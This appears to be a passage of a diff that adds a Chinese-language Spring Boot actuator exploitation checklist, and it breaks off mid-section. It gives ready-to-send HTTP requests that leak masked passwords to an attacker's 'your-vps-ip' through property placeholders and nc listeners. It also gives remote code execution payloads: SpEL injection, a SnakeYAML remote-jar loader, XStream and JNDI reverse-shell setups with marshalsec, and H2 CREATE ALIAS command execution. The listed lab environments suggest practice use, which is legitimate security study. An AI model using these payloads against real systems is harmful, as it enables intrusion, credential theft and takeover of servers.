+<pre><code>POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<ul>
+<li>调用 <code>org.springframework.cloud.context.environment Mbean</code>（需要 <code>spring cloud</code>相关依赖）</li>
+</ul>
+<p><strong>实际上是调用 <code>org.springframework.cloud.context.environment.EnvironmentManager</code> 类实例的 <code>getProperty</code> 方法</strong></p>
+<p>spring 1.x</p>
+<pre><code>POST /jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/jolokia
+Content-Type: application/json
+
+{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
+</code></pre>
+<h4 id="0x04获取被星号脱敏的密码的明文-方法二">0x04：获取被星号脱敏的密码的明文 (方法二)</h4>
+<p>访问 <code>/env</code>接口时，<code>spring actuator</code> 会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果</p>
+<h5 id="利用条件-2">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>GET</code> 请求目标网站的 <code>/env</code></p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code></p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</p>
+</li>
+<li>
+<p>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-2">利用方法：</h5>
+<h6 id="步骤一找到想要获取的属性名-2">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二使用-nc-监听-http-请求">步骤二：使用 nc 监听 HTTP 请求</h6>
+<p>在自己控制的外网服务器上监听 80 端口：</p>
+<pre><code>nc -lvk 80
+</code></pre>
+<h6 id="步骤三设置-eurekaclientserviceurldefaultzone-属性">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h6>
+<p>将下面 <code>http://value:${security.user.password}@your-vps-ip</code> 中的 <code>security.user.password</code> 换成自己想要获取的对应的星号 <code>*</code> 遮掩的属性名；</p>
+<p><code>your-vps-ip</code> 换成自己外网服务器的真实 <code>ip</code> 地址。</p>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:${security.user.password}@your-vps-ip&quot;}
+</code></pre>
+<h6 id="步骤四刷新配置">步骤四：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h6 id="步骤五解码属性值">步骤五：解码属性值</h6>
+<p>正常的话，此时 <code>nc</code> 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
+<pre><code>Authorization: Basic dmFsdWU6MTIzNDU2
+</code></pre>
+<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 <code>base64</code> 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 <code>*</code> 脱敏前的属性值明文。</p>
+<h4 id="0x05获取被星号脱敏的密码的明文-方法三">0x05：获取被星号脱敏的密码的明文 (方法三)</h4>
+<p>访问 <code>/env</code> 接口时，<code>spring actuator</code> 会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果</p>
+<h5 id="利用条件-3">利用条件：</h5>
+<ul>
+<li>
+<p>通过 <code>POST</code> <code>/env</code> 设置属性触发目标对外网指定地址发起任意 <code>http</code> 请求</p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-3">利用方法：</h5>
+<p>参考 <code>UUUUnotfound</code> 提出的 <code>issue-1</code>，可以在目标发外部 <code>http</code> 请求的过程中，在 <code>url path</code> 中利用占位符带出数据</p>
+<h6 id="步骤一找到想要获取的属性名-3">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二使用-nc-监听-http-请求-2">步骤二：使用 nc 监听 HTTP 请求</h6>
+<p>在自己控制的外网服务器上监听 80 端口：</p>
+<pre><code>nc -lvk 80
+</code></pre>
+<h6 id="步骤三触发对外-http-请求">步骤三：触发对外 http 请求</h6>
+<ul>
+<li><code>spring.cloud.bootstrap.location</code> 方法（同时适用于明文数据中有特殊 <code>url</code> 字符的情况）：</li>
+</ul>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=${security.user.password}&quot;}
+</code></pre>
+<ul>
+<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（不适用于明文数据中有特殊 <code>url</code> 字符的情况）：</li>
+</ul>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/${security.user.password}&quot;}
+</code></pre>
+<h6 id="步骤四刷新配置-2">步骤四：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h4 id="0x06获取被星号脱敏的密码的明文-方法四">0x06：获取被星号脱敏的密码的明文 (方法四)</h4>
+<p>访问 <code>/env</code> 接口时，<code>spring actuator</code> 会将一些带有敏感关键词(如 <code>password</code>、<code>secret</code>)的属性名对应的属性值用 <code>*</code> 号替换达到脱敏的效果</p>
+<h5 id="利用条件-4">利用条件：</h5>
+<h6 id="步骤一找到想要获取的属性名-4">步骤一：找到想要获取的属性名</h6>
+<p><code>GET</code> 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 <code>*</code> 遮掩的属性值对应的属性名。</p>
+<h6 id="步骤二下载-jvm-heap-信息">步骤二：下载 jvm heap 信息</h6>
+<p>下载的 <code>heapdump</code> 文件大小通常在 <code>50M—500M</code> 之间，有时候也可能会大于 <code>2G</code></p>
+<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 <code>JVM</code> 堆信息</p>
+<h6 id="步骤三使用-mat-获得-jvm-heap-中的密码明文">步骤三：使用 MAT 获得 jvm heap 中的密码明文</h6>
+<p>参考 文章 方法，使用 <code>Eclipse Memory Analyzer</code> 工具的 <code>OQL</code> 语句 <code>select * from org.springframework.web.context.support.StandardServletEnvironment</code>， 辅助快速过滤分析，获得密码明文</p>
+<h3 id="二远程代码执行">二：远程代码执行</h3>
+<p>由于 <code>spring boot</code> 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准。</p>
+<h4 id="0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</h4>
+<h5 id="利用条件-5">利用条件：</h5>
+<ul>
+<li>
+<p><code>spring boot 1.1.0-1.1.12</code>、<code>1.2.0-1.2.7</code>、<code>1.3.0</code></p>
+</li>
+<li>
+<p>至少知道一个触发 <code>springboot</code> 默认错误页面的接口及参数名</p>
+</li>
+</ul>
+<h5 id="利用方法-4">利用方法：</h5>
+<h6 id="步骤一找到一个正常传参处">步骤一：找到一个正常传参处</h6>
+<p>比如发现访问 <code>/article?id=xxx</code> ，页面会报状态码为<code>500</code>的错误：<code>Whitelabel Error Page</code>，则后续 <code>payload</code> 都将会在参数 <code>id</code> 处尝试。</p>
+<h6 id="步骤二执行-spel-表达式">步骤二：执行 SpEL 表达式</h6>
+<p>输入 <code>/article?id=${7*7}</code> ，如果发现报错页面将 <code>7*7</code> 的值 <code>49</code> 计算出来显示在报错页面上，那么基本可以确定目标存在 <code>SpEL</code> 表达式注入漏洞。</p>
+<p>由字符串格式转换成 <code>0x**</code> <code>java</code> 字节形式，方便执行任意代码：</p>
+<pre><code># coding: utf-8
+
+result = &quot;&quot;
+target = 'open -a Calculator'
+for x in target:
+    result += hex(ord(x)) + &quot;,&quot;
+print(result.rstrip(','))
+</code></pre>
+<p>执行 <code>open -a Calculator</code> 命令</p>
+<pre><code>${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+</code></pre>
+<h5 id="漏洞原理">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>spring boot</code> 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</p>
+</li>
+<li>
+<p>此时 <code>URL</code> 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</p>
+</li>
+<li>
+<p>其中 <code>${}</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 <code>SpEL</code> 表达式被解析执行，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析">漏洞分析：</h5>
+<p><code>SpringBoot SpEL</code>表达式注入漏洞-分析与复现</p>
+<h5 id="漏洞环境">漏洞环境：</h5>
+<p><code>repository/springboot-spel-rce</code></p>
+<p>正常访问</p>
+<pre><code>http://127.0.0.1:9091/article?id=66
+</code></pre>
+<p>执行<code>open -a Calculator</code>命令：</p>
+<pre><code>http://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}
+</code></pre>
+<h4 id="0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</h4>
+<h5 id="利用条件-6">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code> 接口设置属性</p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuato</code> 依赖）</p>
+</li>
+<li>
+<p>目标依赖的 <code>spring-cloud-starter</code> 版本 <code>&lt; 1.3.0.RELEASE</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的 <code>HTTP</code> 服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-5">利用方法：</h5>
+<h6 id="步骤一托管-yml-和-jar-文件">步骤一：托管 yml 和 jar 文件</h6>
+<p>在自己控制的 <code>vps</code> 机器上开启一个简单<code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p>
+<pre><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;]
+  ]]
+]
+</code></pre>
+<p>在网站根目录下放置后缀为 <code>jar</code> 的文件 <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <code>yaml-payload</code>。</p>
+<h6 id="步骤二设置-springcloudbootstraplocation-属性">步骤二：设置 spring.cloud.bootstrap.location 属性</h6>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;}
+</code></pre>
+<h6 id="步骤三刷新配置">步骤三：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h5 id="漏洞原理-2">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>spring.cloud.bootstrap.location</code> 属性被设置为外部恶意 <code>yml</code> 文件<code>URL</code> 地址</p>
+</li>
+<li>
+<p><code>refresh</code> 触发目标机器请求远程 HTTP 服务器上的 <code>yml</code> 文件，获得其内容</p>
+</li>
+<li>
+<p><code>SnakeYAML</code> 由于存在反序列化漏洞，所以解析恶意 <code>yml</code> 内容时会完成指定的动作</p>
+</li>
+<li>
+<p>先是触发 <code>java.net.URL</code> 去拉取远程 <code>HTTP</code> 服务器上的恶意 <code>jar</code> 文件</p>
+</li>
+<li>
+<p>然后是寻找 <code>jar</code> 文件中实现 <code>javax.script.ScriptEngineFactory</code> 接口的类并实例化</p>
+</li>
+<li>
+<p>实例化类时执行恶意代码，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-2">漏洞分析：</h5>
+<p><code>Exploit Spring Boot Actuator 之 Spring Cloud Env</code> 学习笔记</p>
+<h5 id="漏洞环境-2">漏洞环境：</h5>
+<pre><code>repository/springcloud-snakeyaml-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9092/env
+</code></pre>
+<h4 id="0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</h4>
+<h5 id="利用条件-7">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code> 接口设置属性</p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</p>
+</li>
+<li>
+<p>目标使用的 <code>eureka-client &lt; 1.8.7</code>（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</p>
+</li>
+<li>
+<p>目标可以请求攻击者的 <code>HTTP</code> 服务器（请求可出外网）</p>
+</li>
+</ul>
+<h5 id="利用方法-6">利用方法：</h5>
+<h6 id="步骤一架设响应恶意-xstream-payload-的网站">步骤一：架设响应恶意 XStream payload 的网站</h6>
+<p>提供一个依赖 <code>Flask</code> 并符合要求的 <code>python</code> 脚本示例，作用是利用目标 <code>Linux</code> 机器上自带的 <code>python</code> 来反弹<code>shell</code>。</p>
+<p>使用<code>python</code> 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 <code>shell</code> 的 <code>ip</code> 地址和 端口号。</p>
+<h6 id="步骤二监听反弹-shell-的端口">步骤二：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lvp 443
+</code></pre>
+<h6 id="步骤三设置-eurekaclientserviceurldefaultzone-属性-2">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h6>
+<p>spring 1.x</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;}
+</code></pre>
+<h6 id="步骤四刷新配置-3">步骤四：刷新配置</h6>
+<p>spring 1.x</p>
+<pre><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre>
+<h5 id="漏洞原理-3">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>eureka.client.serviceUrl.defaultZone</code> 属性被设置为恶意的外部 <code>eureka server URL</code> 地址</p>
+</li>
+<li>
+<p><code>refresh</code> 触发目标机器请求远程 <code>URL</code>，提前架设的 <code>fake eureka server</code> 就会返回恶意的 <code>payload</code></p>
+</li>
+<li>
+<p>目标机器相关依赖解析 <code>payload</code>，触发 <code>XStream</code> 反序列化，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-3">漏洞分析：</h5>
+<p><code>Spring Boot Actuator</code>从未授权访问到<code>getshell</code></p>
+<h5 id="漏洞环境-3">漏洞环境：</h5>
+<pre><code>repository/springboot-eureka-xstream-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9093/env
+</code></pre>
+<h4 id="0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</h4>
+<h5 id="利用条件-8">利用条件：</h5>
+<ul>
+<li>
+<p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
+</li>
+<li>
+<p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关<code>MBean</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的 <code>HTTP</code> 服务器（请求可出外网）</p>
+</li>
+<li>
+<p><code>JNDI</code> 注入受目标 <code>JDK</code> 版本影响，<code>jdk &lt; 6u201/7u191/8u182/11.0.1</code>（<code>LDAP</code> 方式）</p>
+</li>
+</ul>
+<h5 id="利用方法-7">利用方法：</h5>
+<h6 id="步骤一查看已存在的-mbeans">步骤一：查看已存在的 MBeans</h6>
+<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
+<h6 id="步骤二托管-xml-文件">步骤二：托管 xml 文件</h6>
+<p>在自己控制的 <code>vps</code> 机器上开启一个简单 <code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，内容如下：</p>
+<pre><code>&lt;configuration&gt;
+  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/JNDIObject&quot; as=&quot;appName&quot; /&gt;
+&lt;/configuration&gt;
+</code></pre>
+<h6 id="步骤三准备要执行的-java-代码">步骤三：准备要执行的 Java 代码</h6>
+<p>编写优化过后的用来反弹 <code>shell</code> 的 <code>Java</code> 示例代码 <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 <code>jdk</code> 的方式编译：</p>
+<pre><code>javac -source 1.5 -target 1.5 JNDIObject.java
+</code></pre>
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<h6 id="步骤四架设恶意-ldap-服务">步骤四：架设恶意 ldap 服务</h6>
+<p>下载 <code>marshalsec</code> ，使用下面命令架设对应的 <code>ldap</code> 服务：</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre>
+<h6 id="步骤五监听反弹-shell-的端口">步骤五：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lv 443
+</code></pre>
+<h6 id="步骤六从外部-url-地址加载日志配置文件">步骤六：从外部 URL 地址加载日志配置文件</h6>
+<p>如果目标成功请求了<code>example.xml</code> 并且 <code>marshalsec</code> 也接收到了目标请求，但是目标没有请求 <code>JNDIObject.class</code>，大概率是因为目标环境的 <code>jdk</code>版本太高，导致 <code>JNDI</code> 利用失败。</p>
+<p>替换实际的 <code>your-vps-ip</code> 地址访问 <code>URL</code> 触发漏洞：</p>
+<pre><code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
+</code></pre>
+<h5 id="漏洞原理-4">漏洞原理：</h5>
+<ol>
+<li>
+<p>直接访问可触发漏洞的 <code>URL</code>，相当于通过 <code>jolokia</code> 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</p>
+</li>
+<li>
+<p>目标机器请求外部日志配置文件 <code>URL</code> 地址，获得恶意 <code>xml</code> 文件内容</p>
+</li>
+<li>
+<p>目标机器使用 <code>saxParser.parse</code> 解析 <code>xml</code> 文件 (这里导致了 <code>xxe</code> 漏洞)</p>
+</li>
+<li>
+<p><code>xml</code> 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 <code>JNDI</code> 服务器地址</p>
+</li>
+<li>
+<p>目标机器请求恶意 <code>JNDI</code> 服务器，导致 <code>JNDI</code> 注入，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-4">漏洞分析：</h5>
+<pre><code>spring boot actuator rce via jolokia
+</code></pre>
+<h5 id="漏洞环境-4">漏洞环境：</h5>
+<pre><code>repository/springboot-jolokia-logback-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9094/env
+</code></pre>
+<h4 id="0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</h4>
+<h5 id="利用条件-9">利用条件：</h5>
+<ul>
+<li>
+<p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
+</li>
+<li>
+<p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 <code>MBean</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+<li>
+<p><code>JNDI</code> 注入受目标 <code>JDK</code> 版本影响，<code>jdk &lt; 6u141/7u131/8u121</code>（<code>RMI</code> 方式）</p>
+</li>
+</ul>
+<h5 id="利用方法-8">利用方法：</h5>
+<h6 id="步骤一查看已存在的-mbeans-2">步骤一：查看已存在的 MBeans</h6>
+<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
+<h6 id="步骤二准备要执行的-java-代码">步骤二：准备要执行的 Java 代码</h6>
+<p>编写优化过后的用来反弹 <code>shell</code> 的 <code>Java</code> 示例代码 <code>JNDIObject.java</code>。</p>
+<h6 id="步骤三托管-class-文件">步骤三：托管 class 文件</h6>
+<p>在自己控制的 <code>vps</code> 机器上开启一个简单 <code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>将<strong>步骤二</strong>中编译好的 <code>class</code> 文件拷贝到 <code>HTTP</code> 服务器根目录。</p>
+<h6 id="步骤四架设恶意-rmi-服务">步骤四：架设恶意 rmi 服务</h6>
+<p>下载 <code>marshalsec</code> ，使用下面命令架设对应的 <code>rmi</code> 服务：</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre>
+<h6 id="步骤五监听反弹-shell-的端口-2">步骤五：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lvp 443
+</code></pre>
+<h6 id="步骤六发送恶意-payload">步骤六：发送恶意 payload</h6>
+<p>根据实际情况修改 <code>springboot-realm-jndi-rce.py</code> 脚本中的目标地址，<code>RMI</code> 地址、端口等信息，然后在自己控制的服务器上运行。</p>
+<h5 id="漏洞原理-5">漏洞原理：</h5>
+<ol>
+<li>
+<p>利用 <code>jolokia</code> 调用 <code>createJNDIRealm</code> 创建 <code>JNDIRealm</code></p>
+</li>
+<li>
+<p>设置 <code>connectionURL</code> 地址为 <code>RMI Service URL</code></p>
+</li>
+<li>
+<p>设置 <code>contextFactory</code> 为 <code>RegistryContextFactory</code></p>
+</li>
+<li>
+<p>停止 <code>Realm</code></p>
+</li>
+<li>
+<p>启动 <code>Realm</code> 以触发指定 <code>RMI</code> 地址的 <code>JNDI</code> 注入，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-5">漏洞分析：</h5>
+<pre><code>Yet Another Way to Exploit Spring Boot Actuators via Jolokia
+</code></pre>
+<h5 id="漏洞环境-5">漏洞环境：</h5>
+<pre><code>repository/springboot-jolokia-logback-rce
+</code></pre>
+<p>正常访问:</p>
+<pre><code>http://127.0.0.1:9094/env
+</code></pre>
+<h4 id="0x06h2-database-query-rce">0x06：h2 database query RCE</h4>
+<h5 id="利用条件-10">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code> 接口设置属性</p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/restart</code> 接口重启应用（存在<code>spring-boot-starter-actuator</code>依赖）</p>
+</li>
+<li>
+<p>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</p>
+</li>
+</ul>
+<h5 id="利用方法-9">利用方法：</h5>
+<h6 id="步骤一设置-springdatasourcehikariconnection-test-query-属性">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h6>
+<p>下面<code>payload</code> 中的 <code>'T5'</code>方法每一次执行命令后都需要更换名称 (如<code>T6</code>) ，然后才能被重新创建使用，否则下次 <code>restart</code>重启应用时漏洞不会被触发</p>
+<p>spring 1.x（无回显执行命令）</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
+</code></pre>
+<p>spring 2.x（无回显执行命令）</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');&quot;}
+</code></pre>
+<h6 id="步骤二重启应用">步骤二：重启应用</h6>
+<p>spring 1.x</p>
+<pre><code>POST /restart
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/restart
+Content-Type: application/json
+</code></pre>
+<h5 id="漏洞原理-6">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>spring.datasource.hikari.connection-test-query</code> 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 <code>SQL</code> 语句</p>
+</li>
+<li>
+<p>其属性对应 <code>HikariCP</code> 数据库连接池的 <code>connectionTestQuery</code> 配置，定义一个新数据库连接之前被执行的 <code>SQL</code> 语句</p>
+</li>
+<li>
+<p><code>restart</code> 重启应用，会建立新的数据库连接</p>
+</li>
+<li>
+<p>如果 <code>SQL</code> 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-6">漏洞分析：</h5>
+<pre><code> remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
+</code></pre>
+<h5 id="漏洞环境-6">漏洞环境：</h5>
+<pre><code>repository/springboot-h2-database-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9096/actuator/env
+</code></pre>
+<h4 id="0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</h4>
+<h5 id="利用条件-11">利用条件：</h5>
+<ul>
+<li>
+<p>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</p>
+</li>
+<li>
